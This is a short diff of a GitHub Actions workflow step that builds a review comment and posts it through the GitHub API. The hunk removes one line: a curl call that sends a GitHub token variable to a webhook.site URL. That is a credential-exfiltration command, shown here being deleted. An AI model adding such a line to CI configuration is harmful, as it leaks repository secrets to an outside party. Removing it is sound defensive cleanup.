@@ -768,7 +768,6 @@ jobs:
           # Prepare the comment body
           COMMENT_BODY=$(< /home/runner/work/UmV2aWV3/UmV2aWV3/final.md)
           # echo "COMMENT_BODY: $COMMENT_BODY"
-          curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE          # Post the comment
           curl -X POST \
             -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github.v3+json" \
